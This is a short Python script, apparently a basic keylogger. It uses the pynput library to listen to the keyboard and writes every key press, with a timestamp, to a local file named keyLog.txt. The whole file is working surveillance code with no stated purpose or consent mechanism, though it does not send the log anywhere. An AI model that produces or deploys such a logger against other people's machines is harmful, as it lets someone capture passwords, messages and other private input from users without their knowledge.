import pynput
#Library
from pynput.keyboard import Key, Listener
#vanilla python module
import logging

#make a log file
log_dir = ""


logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
   logging.info(str(key))
    #if key == Key.esc:
        #return false
   
with Listener(on_press=on_press) as listener:
    listener.join()